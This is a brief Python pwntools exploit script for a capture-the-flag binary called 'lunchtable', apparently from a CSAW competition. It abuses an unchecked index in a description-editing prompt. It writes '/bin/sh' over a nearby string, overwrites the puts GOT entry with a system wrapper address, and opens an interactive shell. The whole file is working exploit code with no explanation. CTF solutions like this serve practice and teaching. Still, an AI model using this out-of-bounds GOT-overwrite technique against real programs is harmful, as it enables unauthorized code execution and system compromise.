#!/usr/bin/env python3
from pwn import *


elf = ELF('./lunchtable')
p = elf.process()
# p = remote('pwn.chal.csaw.io', 1001)

system_wrapper = elf.symbols['system_wrapper']

p.recvuntil('What\'s your name?')
p.sendline('A')

p.recvuntil(
    'Describe yourself, we want to know if you\'ll fit at our table...\n'
)
p.sendline('A')

p.recvuntil('Do you want to edit your description? (y/n): ')
p.sendline('y')

p.recvuntil('What do you want to change?')
p.sendline('32')  # 0x6010c0 (goodbye) - 0x6010a0 (buffer) = 32 (decimal)

p.recvuntil('Give me something to replace that with')
p.sendline('/bin/sh')

p.recvuntil('Do you want to edit your description? (y/n): ')
p.sendline('y')

p.recvuntil('What do you want to change?')
p.sendline('-136')  # 0x601018 (puts.got) - 0x6010a0 (buffer) = -136 (decimal)

p.recvuntil('Give me something to replace that with')
p.sendline(p64(system_wrapper))

p.recvuntil('Do you want to edit your description? (y/n): ')
p.sendline('n')

p.interactive()
p.close()
